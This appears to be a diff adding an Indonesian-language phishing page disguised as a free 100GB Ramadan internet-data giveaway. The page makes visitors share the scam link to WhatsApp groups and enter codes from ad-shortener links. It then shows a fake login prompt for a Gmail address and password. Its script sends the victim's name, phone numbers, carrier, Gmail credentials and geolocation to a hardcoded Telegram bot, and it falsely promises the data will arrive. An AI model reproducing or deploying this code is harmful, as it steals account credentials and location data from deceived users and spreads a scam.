@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internet Gratis 100GB - Spesial Ramadhan</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a1f1a 0%, #1a3a2e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: linear-gradient(135deg, #1e3a2f 0%, #2d5a4a 100%);
+            border-radius: 20px;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.5), 0 0 30px rgba(0, 255, 128, 0.2);
+            padding: 40px 30px;
+            max-width: 450px;
+            width: 100%;
+            animation: slideUp 0.5s ease;
+            border: 1px solid rgba(0, 255, 128, 0.3);
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #00ff80;
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(0, 255, 128, 0.6), 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .header p {
+            color: #a8d5ba;
+            font-size: 14px;
+        }
+
+        .greeting {
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 25px;
+            color: #00ff80;
+            text-shadow: 0 0 10px rgba(0, 255, 128, 0.5);
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #a8d5ba;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .input-group input,
+        .input-group select {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #00ff80;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: #0f2419;
+            color: #00ff80;
+        }
+
+        .input-group input:focus,
+        .input-group select:focus {
+            outline: none;
+            border-color: #00ffaa;
+            box-shadow: 0 0 0 3px rgba(0, 255, 128, 0.2), 0 0 20px rgba(0, 255, 128, 0.4);
+        }
+
+        .input-group input::placeholder {
+            color: #4a7c59;
+        }
+
+        .input-group select {
+            cursor: pointer;
+        }
+
+        .input-group select option {
+            background: #0f2419;
+            color: #00ff80;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #00ff80 0%, #00cc66 100%);
+            color: #0a1f1a;
+            box-shadow: 0 4px 15px rgba(0, 255, 128, 0.4), 0 0 30px rgba(0, 255, 128, 0.3);
+            font-weight: 900;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 255, 128, 0.6), 0 0 40px rgba(0, 255, 128, 0.5);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #00ffaa 0%, #00dd88 100%);
+            color: #0a1f1a;
+            margin-top: 15px;
+            box-shadow: 0 4px 15px rgba(0, 255, 170, 0.4), 0 0 30px rgba(0, 255, 170, 0.3);
+            font-weight: 900;
+        }
+
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 255, 170, 0.6), 0 0 40px rgba(0, 255, 170, 0.5);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .code-input-container {
+            margin-bottom: 15px;
+        }
+
+        .code-buttons {
+            display: grid;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .btn-code {
+            background: linear-gradient(135deg, #1a3a2e 0%, #2d5a4a 100%);
+            color: #00ff80;
+            padding: 12px;
+            font-size: 14px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5), 0 0 15px rgba(0, 255, 128, 0.2);
+            border: 1px solid rgba(0, 255, 128, 0.3);
+        }
+
+        .btn-code:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.7), 0 0 25px rgba(0, 255, 128, 0.4);
+            border-color: #00ff80;
+        }
+
+        .footer-info {
+            background: linear-gradient(135deg, #0f2419 0%, #1a3a2e 100%);
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 20px;
+            border-left: 4px solid #00ff80;
+            box-shadow: 0 0 20px rgba(0, 255, 128, 0.1);
+        }
+
+        .footer-info p {
+            color: #a8d5ba;
+            font-size: 13px;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .footer-info p:before {
+            content: "⚡";
+            margin-right: 8px;
+            font-size: 16px;
+            filter: drop-shadow(0 0 5px rgba(0, 255, 128, 0.8));
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #1e3a2f 0%, #2d5a4a 100%);
+            margin: 15% auto;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            animation: slideDown 0.3s ease;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5), 0 0 30px rgba(0, 255, 128, 0.2);
+            border: 1px solid rgba(0, 255, 128, 0.3);
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .modal-content h3 {
+            color: #00ff80;
+            margin-bottom: 20px;
+            font-size: 20px;
+            text-shadow: 0 0 10px rgba(0, 255, 128, 0.5);
+        }
+
+        .modal-content p {
+            color: #a8d5ba;
+        }
+
+        .modal-content input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 2px solid #00ff80;
+            border-radius: 10px;
+            font-size: 14px;
+            background: #0f2419;
+            color: #00ff80;
+        }
+
+        .modal-content input::placeholder {
+            color: #4a7c59;
+        }
+
+        .modal-content input:focus {
+            outline: none;
+            border-color: #00ffaa;
+            box-shadow: 0 0 0 3px rgba(0, 255, 128, 0.2);
+        }
+
+        .modal-content button {
+            margin-top: 15px;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .timer {
+            text-align: center;
+            font-size: 16px;
+            color: #00ff80;
+            font-weight: bold;
+            margin: 15px 0;
+            padding: 10px;
+            background: linear-gradient(135deg, #0f2419 0%, #1a3a2e 100%);
+            border-radius: 8px;
+            border: 1px solid rgba(0, 255, 128, 0.3);
+            box-shadow: 0 0 20px rgba(0, 255, 128, 0.2);
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .glow {
+            animation: glow 1.5s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% {
+                box-shadow: 0 4px 15px rgba(0, 255, 128, 0.4), 0 0 30px rgba(0, 255, 128, 0.3);
+            }
+            50% {
+                box-shadow: 0 4px 25px rgba(0, 255, 128, 0.6), 0 0 50px rgba(0, 255, 128, 0.5);
+            }
+        }
+
+        .share-info {
+            background: linear-gradient(135deg, #0f2419 0%, #1a3a2e 100%);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 4px solid #00ff80;
+            box-shadow: 0 0 20px rgba(0, 255, 128, 0.1);
+        }
+
+        .share-info p {
+            color: #a8d5ba;
+            font-size: 14px;
+            margin: 5px 0;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: #0f2419;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 15px 0;
+            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.3);
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff80 0%, #00ffaa 100%);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+            box-shadow: 0 0 10px rgba(0, 255, 128, 0.5);
+        }
+
+        .error-message {
+            color: #ff4d4d;
+            font-size: 12px;
+            margin-top: 5px;
+            text-align: left;
+            display: none;
+        }
+
+        .input-error {
+            border-color: #ff4d4d !important;
+            box-shadow: 0 0 0 3px rgba(255, 77, 77, 0.2) !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Page 1: Input Name -->
+    <div class="container">
+        <div id="page1" class="page active">
+            <div class="header">
+                <h1>INTERNET GRATIS 100GB</h1>
+                <p>Spesial Ramadhan</p>
+            </div>
+            
+            <div class="input-group">
+                <label>Masukkan Nama Anda</label>
+                <input type="text" id="userName" placeholder="Nama lengkap Anda" autocomplete="off">
+            </div>
+            
+            <button class="btn btn-primary glow" onclick="startProcess()">MULAI</button>
+            
+            <div class="footer-info">
+                <p>Klaim segera sebelum kehabisan!</p>
+                <p>Promo terbatas hanya untuk 1000 orang pertama</p>
+                <p>Gratis tanpa biaya tersembunyi - 100% Legal</p>
+                <p>Sudah 14.000+ orang mendapatkan paket ini!</p>
+            </div>
+        </div>
+
+        <!-- Page 2: Phone Number & Share -->
+        <div id="page2" class="page">
+            <div class="greeting" id="greetingText">👋 Hai!</div>
+            
+            <div class="input-group">
+                <label>Masukkan Nomor HP</label>
+                <input type="tel" id="phoneNumber" placeholder="628xxxxxxxxxx" autocomplete="off">
+            </div>
+            
+            <button class="btn btn-primary glow" onclick="shareToWhatsApp()">SHARE 5 GRUP</button>
+            
+            <button id="verifyBtn" class="btn btn-success" style="display: none;" onclick="goToVerification()">✓ VERIFIKASI</button>
+            
+            <div class="share-info">
+                <p>✓ Share ke minimal 5 grup WhatsApp untuk aktivasi</p>
+                <p>✓ Atau share ke 10 kontak pribadi juga bisa</p>
+                <p>✓ Setelah share, kembali ke sini untuk lanjut</p>
+                <p>✓ Proses otomatis & sangat mudah!</p>
+            </div>
+        </div>
+
+        <!-- Page 3: Code Verification -->
+        <div id="page3" class="page">
+            <div class="header">
+                <h1>VERIFIKASI KODE</h1>
+                <p>Masukan 3 Code Verifikasi</p>
+            </div>
+            
+            <div class="code-input-container">
+                <div class="input-group">
+                    <label>Kode 1</label>
+                    <input type="text" id="code1" placeholder="CODE 1" autocomplete="off">
+                </div>
+                
+                <div class="input-group">
+                    <label>Kode 2</label>
+                    <input type="text" id="code2" placeholder="CODE 2" autocomplete="off">
+                </div>
+                
+                <div class="input-group">
+                    <label>Kode 3</label>
+                    <input type="text" id="code3" placeholder="CODE 3" autocomplete="off">
+                </div>
+            </div>
+            
+            <div class="code-buttons">
+                <button class="btn btn-code" onclick="openChannel('code1')">KLAIM KODE 1</button>
+                <button class="btn btn-code" onclick="openChannel('code2')">KLAIM KODE 2</button>
+                <button class="btn btn-code" onclick="openChannel('code3')">KLAIM KODE 3</button>
+                <button class="btn btn-code" onclick="openChannel('tutorial')">CARA LEWATI LINK</button>
+            </div>
+            
+            <button class="btn btn-primary glow" onclick="verifyCodes()">🎁 KLAIM INTERNET 100GB</button>
+            
+            <div class="footer-info">
+                <p>Dapatkan semua kode verifikasi</p>
+                <p>Kode berubah setiap hari untuk keamanan</p>
+                <p>Pastikan Anda sudah dapat 3 code</p>
+            </div>
+        </div>
+
+        <!-- Page 4: Final Claim -->
+        <div id="page4" class="page">
+            <div class="header">
+                <h1>KLAIM HADIAH</h1>
+                <p>Isi data untuk menerima paket</p>
+            </div>
+            
+            <div class="input-group">
+                <label>Masukkan Nomor</label>
+                <input type="tel" id="finalPhone" placeholder="628xxxxxxxxxx" autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <label>Operator Seluler</label>
+                <select id="operator">
+                    <option value="">Pilih Operator</option>
+                    <option value="Indosat">Indosat</option>
+                    <option value="By.U">By.U</option>
+                    <option value="Axis">Axis</option>
+                    <option value="Smartfren">Smartfren</option>
+                    <option value="Three (3)">Three (3)</option>
+                    <option value="XL Axiata">XL Axiata</option>
+                    <option value="Telkomsel">Telkomsel</option>
+                </select>
+            </div>
+            
+            <button class="btn btn-primary glow" onclick="showLoginModal()">🎁 KLAIM SEKARANG</button>
+            
+            <div class="footer-info">
+                <p>Paket internet akan dikirim otomatis dalam 24 jam</p>
+                <p>Pastikan nomor dan operator yang Anda pilih sudah benar</p>
+                <p>Cek inbox atau dial *123# untuk konfirmasi paket</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Modal -->
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <h3>🔐 Login Diperlukan</h3>
+            <p style="margin-bottom: 20px;">Harap login terlebih dahulu!</p>
+            
+            <div style="position: relative;">
+                <input type="email" id="gmail" placeholder="Masukkan Gmail">
+                <div id="gmailError" class="error-message">Gmail salah</div>
+            </div>
+            
+            <div style="position: relative;">
+                <input type="password" id="password" placeholder="Masukkan Password">
+                <div id="passwordError" class="error-message">Password minimal 8 karakter</div>
+            </div>
+            
+            <div class="progress-container" id="progressContainer" style="display: none;">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <button class="btn btn-primary" onclick="submitLogin()">LOGIN</button>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <h3>✅ BERHASIL!</h3>
+            <p style="color: #28a745; font-size: 16px; margin: 20px 0;">
+                INTERNET 100 GB AKAN DIKIRIM DALAM 24 JAM, HARAP MENUNGGU!
+            </p>
+            <button class="btn btn-success" onclick="closeSuccessModal()">OK</button>
+        </div>
+    </div>
+
+    <script>
+        let userData = {
+            name: '',
+            phone: '',
+            finalPhone: '',
+            operator: '',
+            gmail: '',
+            password: '',
+            location: ''
+        };
+
+        const BOT_TOKEN = '8437935816:AAHgd4QRoMi_2u2gZFShQpi7zmEj0YtTt9U';
+        const CHAT_ID = '8430201817';
+        const WA_CHANNEL = 'https://whatsapp.com/channel/0029Vb7OAmiAO7RDXIr0TW1l';
+
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(pageId).classList.add('active');
+        }
+
+        function startProcess() {
+            const name = document.getElementById('userName').value.trim();
+            if (!name) {
+                alert('Silakan masukkan nama Anda terlebih dahulu!');
+                return;
+            }
+            userData.name = name;
+            document.getElementById('greetingText').textContent = `👋 Haii ${name}`;
+            showPage('page2');
+        }
+
+        function shareToWhatsApp() {
+            const phone = document.getElementById('phoneNumber').value.trim();
+            if (!phone) {
+                alert('Silakan masukkan nomor HP terlebih dahulu!');
+                return;
+            }
+            userData.phone = phone;
+
+            // Get deployed website URL (replace with your actual deployed URL)
+            const websiteUrl = window.location.href;
+
+            const message = `🎁 *DAPATKAN INTERNET GRATIS 100 GB* 🎁
+━━━━━━━━━━━━━━━━━━━━━
+🌟 *SPESIAL RAMADHAN* 🌟
+
+✅ *100% GRATIS & LEGAL*
+✅ *Berlaku untuk Semua Operator*
+✅ *Tanpa Biaya Tersembunyi*
+✅ *Proses Cepat & Mudah*
+
+📱 *Pilih Provider Anda:*
+
+🔷 *Indosat Ooredoo*
+${websiteUrl}
+
+🔷 *By.U (Telkomsel Digital)*
+${websiteUrl}
+
+🔷 *AXIS (XL Network)*
+${websiteUrl}
+
+🔷 *Smartfren 4G/5G*
+${websiteUrl}
+
+🔷 *Three (3) Indonesia*
+${websiteUrl}
+
+🔷 *XL Axiata*
+${websiteUrl}
+
+🔷 *Telkomsel*
+${websiteUrl}
+
+━━━━━━━━━━━━━━━━━━━━━
+⚡ *Buruan Klaim!* Promo Terbatas!
+⏰ Hanya untuk *1000 orang pertama*
+🎯 Sudah *14.000+ pengguna* berhasil!
+
+💚 _Bagikan ke teman & keluarga Anda!_`;
+
+            const encodedMessage = encodeURIComponent(message);
+            const whatsappUrl = `https://wa.me/?text=${encodedMessage}`;
+            
+            // Open WhatsApp
+            window.open(whatsappUrl, '_blank');
+            
+            // Start hidden countdown timer (no display)
+            let countdown = 6;
+            
+            const timer = setInterval(() => {
+                countdown--;
+                
+                if (countdown <= 0) {
+                    clearInterval(timer);
+                    document.getElementById('verifyBtn').style.display = 'block';
+                }
+            }, 1000);
+        }
+
+        function goToVerification() {
+            showPage('page3');
+        }
+
+        function openChannel(linkType) {
+            const links = {
+                'code1': 'https://sfl.gl/KjoLK3EM',
+                'code2': 'https://sfl.gl/QzWv',
+                'code3': 'https://sfl.gl/whhQeY',
+                'tutorial': 'https://youtube.com/shorts/Ig15R7fkPCI?si=R2XSgQ1tVE82p2Eb'
+            };
+            window.open(links[linkType], '_blank');
+        }
+
+        function verifyCodes() {
+            const code1 = document.getElementById('code1').value.trim().toUpperCase();
+            const code2 = document.getElementById('code2').value.trim().toUpperCase();
+            const code3 = document.getElementById('code3').value.trim().toUpperCase();
+
+            if (code1 !== 'VLXZ78' || code2 !== 'XL69HG' || code3 !== 'FV7KJH') {
+                alert('Kode verifikasi salah! Silakan cek kembali di channel WhatsApp kami.');
+                return;
+            }
+
+            showPage('page4');
+        }
+
+        function showLoginModal() {
+            const finalPhone = document.getElementById('finalPhone').value.trim();
+            const operator = document.getElementById('operator').value;
+
+            if (!finalPhone || !operator) {
+                alert('Silakan lengkapi nomor HP dan operator seluler!');
+                return;
+            }
+
+            userData.finalPhone = finalPhone;
+            userData.operator = operator;
+
+            document.getElementById('loginModal').style.display = 'block';
+        }
+
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            resolve(`${lat}, ${lon}`);
+                        },
+                        (error) => {
+                            resolve('DITOLAK');
+                        }
+                    );
+                } else {
+                    resolve('TIDAK DIDUKUNG');
+                }
+            });
+        }
+
+        async function submitLogin() {
+            const gmail = document.getElementById('gmail').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const gmailInput = document.getElementById('gmail');
+            const passwordInput = document.getElementById('password');
+            const gmailError = document.getElementById('gmailError');
+            const passwordError = document.getElementById('passwordError');
+
+            // Reset error states
+            gmailInput.classList.remove('input-error');
+            passwordInput.classList.remove('input-error');
+            gmailError.style.display = 'none';
+            passwordError.style.display = 'none';
+
+            let hasError = false;
+
+            // Validate Gmail
+            if (!gmail.endsWith('@gmail.com')) {
+                gmailInput.classList.add('input-error');
+                gmailError.style.display = 'block';
+                hasError = true;
+            }
+
+            // Validate Password
+            if (password.length < 8) {
+                passwordInput.classList.add('input-error');
+                passwordError.style.display = 'block';
+                hasError = true;
+            }
+
+            if (hasError) {
+                return;
+            }
+
+            userData.gmail = gmail;
+            userData.password = password;
+
+            // Show progress bar
+            const progressContainer = document.getElementById('progressContainer');
+            const progressBar = document.getElementById('progressBar');
+            progressContainer.style.display = 'block';
+            progressBar.style.width = '0%';
+
+            // Animate progress
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 10;
+                progressBar.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                }
+            }, 150);
+
+            // Get location
+            userData.location = await getLocation();
+
+            // Send to Telegram
+            await sendToTelegram();
+
+            // Close login modal and show success
+            setTimeout(() => {
+                document.getElementById('loginModal').style.display = 'none';
+                document.getElementById('successModal').style.display = 'block';
+                progressContainer.style.display = 'none';
+                progressBar.style.width = '0%';
+            }, 1500);
+        }
+
+        async function sendToTelegram() {
+            const message = `🎁 NEW DATA RECEIVED 🎁
+
+👤 NAMA USER: ${userData.name}
+📱 NO WHATSAPP: ${userData.phone}
+📞 NO FINAL: ${userData.finalPhone}
+📡 SELECT TYPE: ${userData.operator}
+📧 GMAIL LOG: ${userData.gmail}
+🔐 PASSWORD: ${userData.password}
+📍 LOKASI USER: ${userData.location}
+
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        function closeSuccessModal() {
+            document.getElementById('successModal').style.display = 'none';
+            // Reset to first page
+            showPage('page1');
+            // Clear all inputs
+            document.getElementById('userName').value = '';
+            document.getElementById('phoneNumber').value = '';
+            document.getElementById('code1').value = '';
+            document.getElementById('code2').value = '';
+            document.getElementById('code3').value = '';
+            document.getElementById('finalPhone').value = '';
+            document.getElementById('operator').value = '';
+            document.getElementById('gmail').value = '';
+            document.getElementById('password').value = '';
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const loginModal = document.getElementById('loginModal');
+            const successModal = document.getElementById('successModal');
+            if (event.target == loginModal) {
+                loginModal.style.display = 'none';
+            }
+            if (event.target == successModal) {
+                closeSuccessModal();
+            }
+        }
+    </script>
+</body>
+</html>
